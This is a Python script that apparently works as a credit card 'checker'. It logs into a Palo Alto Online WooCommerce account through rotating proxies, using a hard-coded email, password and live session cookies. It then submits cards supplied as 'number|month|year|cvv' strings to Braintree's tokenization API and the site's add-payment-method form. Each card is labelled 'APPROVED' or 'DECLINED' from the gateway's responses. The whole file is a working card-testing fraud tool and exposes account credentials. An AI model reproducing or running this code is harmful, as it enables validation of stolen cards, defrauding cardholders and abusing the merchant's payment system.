import requests
import AdyenEncrypt
import json
import base64
from parse import parseX
import uuid
import random

proxiess = "proxys.txt"

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def braintree(tarjeta):
    try:
        session = requests.Session()
        with open(proxiess, 'r') as file:
            proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
        
        SessionId = generar_codigo_session()

        splitter = tarjeta.split('|')
        ccnum = splitter[0]
        mes = splitter[1]
        cvv = splitter[3]
        ano = splitter[2]
        if len(ano) == 2:
            ano = "20" + ano
            

        req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
        brand = req['brand'].lower()
            


        headers = {
            'authority': 'www.paloaltoonline.com',
            #'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': 'test; _parsely_session={%22sid%22:1%2C%22surl%22:%22https://www.paloaltoonline.com/my-account/%22%2C%22sref%22:%22%22%2C%22sts%22:1707549158228%2C%22slts%22:0}; _parsely_visitor={%22id%22:%22pid=90a2aea7-5ea9-444f-b729-d7c6e4c294fa%22%2C%22session_count%22:1%2C%22last_session_ts%22:1707549158228}; newspack-cid=HOxGvL2zdhkW; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _cb=B7OK1UDhJ8TTVueWy; _ga=GA1.1.212360858.1707549159; pushalert_32690_1_c_expire_time=1739171559570; pushalert_32690_1_subs_status=canceled; np_auth_strategy=pwd; __gads=ID=f03c14c59b50b192:T=1707549159:RT=1707549466:S=ALNI_MascoeeknT4NEp0rwCt-TIWaLpCLg; __gpi=UID=00000a0cc5b1ce68:T=1707549159:RT=1707549466:S=ALNI_MYLl6TZ4Yi0HCPNVDm6-HSNsirqcg; wordpress_logged_in_6ac7259d904577eac223fab6d57f43f3=naneteharlequin%40jcnorris.com%7C1739085483%7CTZhaqstDRc9KUlOt2t0RZOW0jTDG5FAOMMTK0GJnBZE%7Caa73505da0c3910fea3e20b46cdd90e09d45f1d711a99bc265024d2526c4b559; np_auth_reader=naneteharlequin%40jcnorris.com; tk_qs=; _cb_svref=external; _chartbeat2=.1707549158759.1707549599819.1.DKf9AjB0Zo-fCgzaRQBaAlTnD2s-Av.2; tk_ai=v6BBP7GGHNlEUjMbzoBHeSZ2; _ga_KBH7GWY29S=GS1.1.1707549159.1.1.1707549600.31.0.0; _ga_QYEZB1Y93W=GS1.1.1707549159.1.1.1707549600.0.0.0; _parsely_slot_click={%22url%22:%22https://www.paloaltoonline.com/my-account/?password-reset=true%22%2C%22x%22:836%2C%22y%22:39%2C%22xpath%22:%22//*[@id=%5C%22menu-tertiary-menu-1%5C%22]/li[2]/a[1]%22%2C%22href%22:%22https://www.paloaltoonline.com/my-account/%22}; _chartbeat5=753|332|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fbecome-a-member%2F|DEtbvVDsto1k_NFQMCarSNaCtcq7G||c|Sigy9D0pWWyasTbav5c0DDrnlPg|paloaltoonline.com|::836|39|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fmy-account%2F|DakfZfBI7ArWCmNOZyDQknxSDRlVp-||c|B9aFP8DLsdfnCsXmuhCoTyVgDcwl_a|paloaltoonline.com|',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        response = session.get('https://www.paloaltoonline.com/my-account', headers=headers).text

        part1 = parseX(response, 'name="lists[]"', '" ').strip()
        login = parseX(part1, 'value="', '"')
        print(login)

        headers = {
            'authority': 'www.paloaltoonline.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            #'cookie': 'test; _parsely_session={%22sid%22:1%2C%22surl%22:%22https://www.paloaltoonline.com/my-account/%22%2C%22sref%22:%22%22%2C%22sts%22:1707549158228%2C%22slts%22:0}; _parsely_visitor={%22id%22:%22pid=90a2aea7-5ea9-444f-b729-d7c6e4c294fa%22%2C%22session_count%22:1%2C%22last_session_ts%22:1707549158228}; newspack-cid=HOxGvL2zdhkW; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _cb=B7OK1UDhJ8TTVueWy; _ga=GA1.1.212360858.1707549159; pushalert_32690_1_c_expire_time=1739171559570; pushalert_32690_1_subs_status=canceled; np_auth_strategy=pwd; __gads=ID=f03c14c59b50b192:T=1707549159:RT=1707549466:S=ALNI_MascoeeknT4NEp0rwCt-TIWaLpCLg; __gpi=UID=00000a0cc5b1ce68:T=1707549159:RT=1707549466:S=ALNI_MYLl6TZ4Yi0HCPNVDm6-HSNsirqcg; wordpress_logged_in_6ac7259d904577eac223fab6d57f43f3=naneteharlequin%40jcnorris.com%7C1739085483%7CTZhaqstDRc9KUlOt2t0RZOW0jTDG5FAOMMTK0GJnBZE%7Caa73505da0c3910fea3e20b46cdd90e09d45f1d711a99bc265024d2526c4b559; np_auth_reader=naneteharlequin%40jcnorris.com; tk_qs=; _chartbeat5=753|332|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fbecome-a-member%2F|DEtbvVDsto1k_NFQMCarSNaCtcq7G||c|Sigy9D0pWWyasTbav5c0DDrnlPg|paloaltoonline.com|::836|39|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fmy-account%2F|DakfZfBI7ArWCmNOZyDQknxSDRlVp-||c|B9aFP8DLsdfnCsXmuhCoTyVgDcwl_a|paloaltoonline.com|; _chartbeat2=.1707549158759.1707549622926.1.cqCCRCn5BNVC2atisB6ZbWfBV3lW2.1; _cb_svref=external; _ga_QYEZB1Y93W=GS1.1.1707549159.1.1.1707549623.0.0.0; tk_ai=0EgMwoFxXu9i08EymMN5UIqW; _ga_KBH7GWY29S=GS1.1.1707549159.1.1.1707549624.7.0.0',
            'origin': 'https://www.paloaltoonline.com',
            'referer': 'https://www.paloaltoonline.com/my-account/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        files = [
            ('reader-activation-auth-form', (None, '1')),
            ('action', (None, 'pwd')),
            ('redirect', (None, 'https://www.paloaltoonline.com/my-account/')),
            ('lists[]', (None, 'group-045dbfb246-ba1b002ad7')),
            ('lists[]', (None, 'group-2fb4a1965c-ba1b002ad7')),
            ('lists[]', (None, 'group-e54c2ecd7b-ba1b002ad7')),
            ('lists[]', (None, 'group-d85f3b83f0-ba1b002ad7')),
            ('lists[]', (None, 'group-ad81a529a7-ba1b002ad7')),
            ('npe', (None, 'naneteharlequin@jcnorris.com')),
            ('password', (None, 'Kurama#1212')),
        ]

        response = session.post('https://www.paloaltoonline.com/my-account/', headers=headers, files=files)

        headers = {
            'authority': 'www.paloaltoonline.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            #'cookie': 'test; _parsely_session={%22sid%22:1%2C%22surl%22:%22https://www.paloaltoonline.com/my-account/%22%2C%22sref%22:%22%22%2C%22sts%22:1707549158228%2C%22slts%22:0}; _parsely_visitor={%22id%22:%22pid=90a2aea7-5ea9-444f-b729-d7c6e4c294fa%22%2C%22session_count%22:1%2C%22last_session_ts%22:1707549158228}; newspack-cid=HOxGvL2zdhkW; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _cb=B7OK1UDhJ8TTVueWy; _ga=GA1.1.212360858.1707549159; pushalert_32690_1_c_expire_time=1739171559570; pushalert_32690_1_subs_status=canceled; np_auth_strategy=pwd; __gads=ID=f03c14c59b50b192:T=1707549159:RT=1707549466:S=ALNI_MascoeeknT4NEp0rwCt-TIWaLpCLg; __gpi=UID=00000a0cc5b1ce68:T=1707549159:RT=1707549466:S=ALNI_MYLl6TZ4Yi0HCPNVDm6-HSNsirqcg; _cb_svref=external; wordpress_logged_in_6ac7259d904577eac223fab6d57f43f3=naneteharlequin%40jcnorris.com%7C1739085654%7CGsDeeTCCYaZMo3bHNL64htYVJrm3SfUh8XG3sukTm17%7C37d591c76eb9a21d2f919eff991f85dede6cb436f347fe21ebdf9e6559197ac4; np_auth_reader=naneteharlequin%40jcnorris.com; _chartbeat2=.1707549158759.1707549665980.1.cqCCRCn5BNVC2atisB6ZbWfBV3lW2.3; _ga_QYEZB1Y93W=GS1.1.1707549159.1.1.1707549666.0.0.0; tk_ai=rj3vW2Y75fzxHKhn6H%2BBRAU%2B; tk_qs=; _ga_KBH7GWY29S=GS1.1.1707549159.1.1.1707549667.50.0.0; _chartbeat5=753|332|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fbecome-a-member%2F|DEtbvVDsto1k_NFQMCarSNaCtcq7G||c|Sigy9D0pWWyasTbav5c0DDrnlPg|paloaltoonline.com|::836|39|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fmy-account%2F|DakfZfBI7ArWCmNOZyDQknxSDRlVp-||c|B9aFP8DLsdfnCsXmuhCoTyVgDcwl_a|paloaltoonline.com|::29|681|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fmy-account%2Fadd-payment-method%2F|B0tG8WPIfdyB1U1bPCeMnKBQuFqR||c|Zq005D3JTJhBDzbC5DbzvgirZVou|paloaltoonline.com|',
            'referer': 'https://www.paloaltoonline.com/my-account/payment-methods/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        response = session.get('https://www.paloaltoonline.com/my-account/add-payment-method/', headers=headers).text

        nonce = parseX(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        nonce2 = parseX(response, '"client_token_nonce":"', '"')



        headers = {
            'authority': 'www.paloaltoonline.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'wordpress_sec_6ac7259d904577eac223fab6d57f43f3=naneteharlequin%40jcnorris.com%7C1739085654%7CGsDeeTCCYaZMo3bHNL64htYVJrm3SfUh8XG3sukTm17%7C2800abdebb3500699e79614c7693ea77a25659ab9b0bc9745736f30087b3df3b; _parsely_session={%22sid%22:1%2C%22surl%22:%22https://www.paloaltoonline.com/my-account/%22%2C%22sref%22:%22%22%2C%22sts%22:1707549158228%2C%22slts%22:0}; _parsely_visitor={%22id%22:%22pid=90a2aea7-5ea9-444f-b729-d7c6e4c294fa%22%2C%22session_count%22:1%2C%22last_session_ts%22:1707549158228}; newspack-cid=HOxGvL2zdhkW; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _cb=B7OK1UDhJ8TTVueWy; _ga=GA1.1.212360858.1707549159; pushalert_32690_1_c_expire_time=1739171559570; pushalert_32690_1_subs_status=canceled; np_auth_strategy=pwd; __gads=ID=f03c14c59b50b192:T=1707549159:RT=1707549466:S=ALNI_MascoeeknT4NEp0rwCt-TIWaLpCLg; __gpi=UID=00000a0cc5b1ce68:T=1707549159:RT=1707549466:S=ALNI_MYLl6TZ4Yi0HCPNVDm6-HSNsirqcg; _cb_svref=external; wordpress_logged_in_6ac7259d904577eac223fab6d57f43f3=naneteharlequin%40jcnorris.com%7C1739085654%7CGsDeeTCCYaZMo3bHNL64htYVJrm3SfUh8XG3sukTm17%7C37d591c76eb9a21d2f919eff991f85dede6cb436f347fe21ebdf9e6559197ac4; np_auth_reader=naneteharlequin%40jcnorris.com; _chartbeat2=.1707549158759.1707549665980.1.cqCCRCn5BNVC2atisB6ZbWfBV3lW2.3; tk_ai=rj3vW2Y75fzxHKhn6H%2BBRAU%2B; tk_qs=; _chartbeat5=753|332|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fbecome-a-member%2F|DEtbvVDsto1k_NFQMCarSNaCtcq7G||c|Sigy9D0pWWyasTbav5c0DDrnlPg|paloaltoonline.com|::836|39|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fmy-account%2F|DakfZfBI7ArWCmNOZyDQknxSDRlVp-||c|B9aFP8DLsdfnCsXmuhCoTyVgDcwl_a|paloaltoonline.com|::29|681|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fmy-account%2Fadd-payment-method%2F|B0tG8WPIfdyB1U1bPCeMnKBQuFqR||c|Zq005D3JTJhBDzbC5DbzvgirZVou|paloaltoonline.com|; _chartbeat4=t=BrXmvaB4BmIlDIHZPIDmY0Pf6OD1B&E=5&x=443&c=0.18&y=2470&w=654; _ga_KBH7GWY29S=GS1.1.1707549159.1.1.1707549676.41.0.0; _ga_QYEZB1Y93W=GS1.1.1707549159.1.1.1707549676.0.0.0',
            'origin': 'https://www.paloaltoonline.com',
            'referer': 'https://www.paloaltoonline.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': nonce2,
        }

        response = session.post('https://www.paloaltoonline.com/wp-admin/admin-ajax.php', headers=headers, data=data).text
        clienttoken = parseX(response, '"data":"', '"')
        bearer = json.loads(base64.b64decode(clienttoken))
        bearer = bearer['authorizationFingerprint']


        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {bearer}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': SessionId,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': ccnum,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()

        tokencc = response['data']['tokenizeCreditCard']['token']

        headers = {
            'authority': 'www.paloaltoonline.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            #'cookie': 'test; _parsely_session={%22sid%22:1%2C%22surl%22:%22https://www.paloaltoonline.com/my-account/%22%2C%22sref%22:%22%22%2C%22sts%22:1707549158228%2C%22slts%22:0}; _parsely_visitor={%22id%22:%22pid=90a2aea7-5ea9-444f-b729-d7c6e4c294fa%22%2C%22session_count%22:1%2C%22last_session_ts%22:1707549158228}; newspack-cid=HOxGvL2zdhkW; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _cb=B7OK1UDhJ8TTVueWy; _ga=GA1.1.212360858.1707549159; pushalert_32690_1_c_expire_time=1739171559570; pushalert_32690_1_subs_status=canceled; np_auth_strategy=pwd; __gads=ID=f03c14c59b50b192:T=1707549159:RT=1707549466:S=ALNI_MascoeeknT4NEp0rwCt-TIWaLpCLg; __gpi=UID=00000a0cc5b1ce68:T=1707549159:RT=1707549466:S=ALNI_MYLl6TZ4Yi0HCPNVDm6-HSNsirqcg; _cb_svref=external; wordpress_logged_in_6ac7259d904577eac223fab6d57f43f3=naneteharlequin%40jcnorris.com%7C1739085654%7CGsDeeTCCYaZMo3bHNL64htYVJrm3SfUh8XG3sukTm17%7C37d591c76eb9a21d2f919eff991f85dede6cb436f347fe21ebdf9e6559197ac4; np_auth_reader=naneteharlequin%40jcnorris.com; _chartbeat2=.1707549158759.1707549679063.1.cqCCRCn5BNVC2atisB6ZbWfBV3lW2.4; _chartbeat5=753|332|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fbecome-a-member%2F|DEtbvVDsto1k_NFQMCarSNaCtcq7G||c|Sigy9D0pWWyasTbav5c0DDrnlPg|paloaltoonline.com|::836|39|%2Fmy-account%2F|https%3A%2F%2Fwww.paloaltoonline.com%2Fmy-account%2F|DakfZfBI7ArWCmNOZyDQknxSDRlVp-||c|B9aFP8DLsdfnCsXmuhCoTyVgDcwl_a|paloaltoonline.com|; tk_qs=; tk_ai=Ik3nEA77CyvcKGN84nQKKcIx; _ga_QYEZB1Y93W=GS1.1.1707549159.1.1.1707549679.0.0.0; _ga_KBH7GWY29S=GS1.1.1707549159.1.1.1707549687.30.0.0',
            'origin': 'https://www.paloaltoonline.com',
            'referer': 'https://www.paloaltoonline.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': tokencc,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = session.post('https://www.paloaltoonline.com/my-account/add-payment-method/', headers=headers, data=data).text
        code = parseX(response, '<div class="wc-block-components-notice-banner__content">', '</div>')


        if int(code.find('New payment method added')) > 0 :
                    print("Approved", "(1000) Approved")
                    msg = "APPROVED ✅"
                    respuesta = "(1000) Approved"
                                    

        elif int(code.find('Duplicate card exists in the vault')) > 0 :
                    msg = "APPROVED ✅"
                    respuesta = "Duplicate card exists in the vault."
                    
        elif int(code.find('Card Issuer Declined CVV')) > 0 :
                    msg = "APPROVED CCN✅"
                    respuesta = "Card Issuer Declined CVV (C2 : CVV2 DECLINED)"
                    
        elif int(code.find('Insufficient Funds')) > 0 :
                    msg = "APPROVED CVV✅"
                    respuesta = "Insufficient Funds"
                    
        elif int(code.find('Gateway Rejected: avs')) > 0 :
                    msg = "APPROVED ✅"
                    respuesta = "Gateway Rejected: avs"
                    
        elif int(code.find('avs_and_cvv')) > 0 :
                    msg = "APPROVED ✅"
                    respuesta = "Gateway Rejected: avs_and_cvv"
                    
        else:
                    respuesta = code
                    msg = "DECLINED ❌"
                    
        session.close()   
        print(msg, "B3MAX")       
        return msg, respuesta
                
    
    except Exception as e:
        print("Se produjo una excepción:", e)
        msg = "DECLINED ❌"
        respuesta = "Ha ocurrido un error"
        
        return msg, respuesta
   

